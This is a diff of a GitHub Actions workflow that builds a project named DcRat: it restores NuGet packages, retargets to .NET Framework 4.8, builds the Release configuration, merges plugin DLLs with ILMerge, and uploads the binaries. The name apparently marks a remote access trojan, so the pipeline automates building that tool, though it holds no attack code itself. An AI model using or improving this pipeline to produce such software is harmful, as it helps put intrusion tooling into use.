@@ -1,4 +1,4 @@
-name: Build DcRat Release
+name: Build DcRat
 
 on:
   push:
@@ -8,33 +8,19 @@ on:
 
 jobs:
   build:
-    strategy:
-      matrix:
-        configuration: [Release]
-
     runs-on: windows-latest
 
     steps:
-    - name: Checkout
-      uses: actions/checkout@main
-      with:
-        fetch-depth: 0
+    - name: Checkout code
+      uses: actions/checkout@v4
 
-    # Install the .NET Core workload
-    - name: Install .NET Core
-      uses: actions/setup-dotnet@v1
-      
-    # Install 7Zip PowerShell Module
-    - name: Install 7Zip PowerShell Module
-      shell: powershell
-      run: Install-Module 7Zip4PowerShell -Force -Verbose
-
-    # Add MSBuild to the PATH
     - name: Setup MSBuild
-      uses: microsoft/setup-msbuild@v1.0.2
+      uses: microsoft/setup-msbuild@v2
 
-    # Install NuGet packages
-    - name: Install NuGet Packages
+    - name: Setup NuGet
+      uses: NuGet/setup-nuget@v2
+
+    - name: Restore NuGet packages
       run: nuget restore DcRat.sln
 
     - name: 🔧 Retarget all projects to .NET Framework 4.8
@@ -46,46 +32,41 @@ jobs:
         }
         Write-Host "Retargeting complete."
 
+    - name: 🧱 Build solution
+      run: msbuild -nologo -v:m -p:Configuration=Release DcRat.sln
 
-    # Build solution
-    - name: Build solution
-      run: msbuild -nologo -v:m -p:Configuration=${{ matrix.configuration }} DcRat.sln
-        
-    # Build Artifact
-    - name: Build Artifact
-      shell: cmd
-      run: call .\ArtifactBuild.cmd
-      
-    # Delete-tag-and-release
-    - name: Delete-tag-and-release
-      uses: dev-drprasad/delete-tag-and-release@v0.2.1
+    - name: ⚡ Merge plugin DLLs using ILMerge with dependencies
+      shell: pwsh
+      run: |
+        $ilmerge = "C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\ILMerge.exe"
+        $outputDir = "D:\a\DcRat\DcRat\Binaries\Release\Plugins"
+        if (!(Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir }
+
+        $plugins = Get-ChildItem -Path "DcRat\DcRat\Plugin" -Directory
+        foreach ($plugin in $plugins) {
+            $dllPath = Join-Path $plugin.FullName "obj\Release\$($plugin.Name).dll"
+            if (!(Test-Path $dllPath)) { Write-Warning "$($plugin.Name) DLL not found, skipping"; continue }
+
+            # 收集依赖 DLL（MessagePackLib + 其他 Release DLL）
+            $dependencyDlls = @("D:\a\DcRat\DcRat\MessagePack\bin\Release\MessagePackLib.dll")
+            $pluginReleaseDlls = Get-ChildItem -Path $plugin.FullName -Recurse -Filter *.dll | Where-Object { $_.FullName -ne $dllPath }
+            foreach ($dep in $pluginReleaseDlls) { $dependencyDlls += $dep.FullName }
+
+            $outputDll = Join-Path $outputDir "$($plugin.Name).dll"
+            Write-Host "Merging $($plugin.Name) with dependencies..."
+            & $ilmerge `
+              /targetplatform:v4,"C:\Windows\Microsoft.NET\Framework\v4.0.30319" `
+              /allowDup `
+              /closed `
+              /out:$outputDll `
+              $dllPath `
+              $dependencyDlls `
+              2>&1 | Write-Host
+        }
+      continue-on-error: true
+
+    - name: 📦 Upload build artifacts
+      uses: actions/upload-artifact@v4
       with:
-        delete_release: true # default: false
-        tag_name: AutoBuild # tag name to delete
-      env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-    
-    # Create Release
-    - name: Create Release
-      id: create_release
-      uses: actions/create-release@latest
-      env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      with:
-        tag_name: AutoBuild
-        release_name: AutoBuild
-        body: ${{ steps.changelog.outputs.changelog }}
-        draft: false
-        prerelease: true
-        
-    # Upload Release Asset
-    - name: Upload Release Asset
-      id: upload-release-asset 
-      uses: actions/upload-release-asset@v1
-      env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      with:
-        upload_url: ${{ steps.create_release.outputs.upload_url }}
-        asset_path: ./DcRat.zip
-        asset_name: DcRat.zip
-        asset_content_type: application/zip
+        name: DcRat-Build
+        path: D:\a\DcRat\DcRat\Binaries\Release\
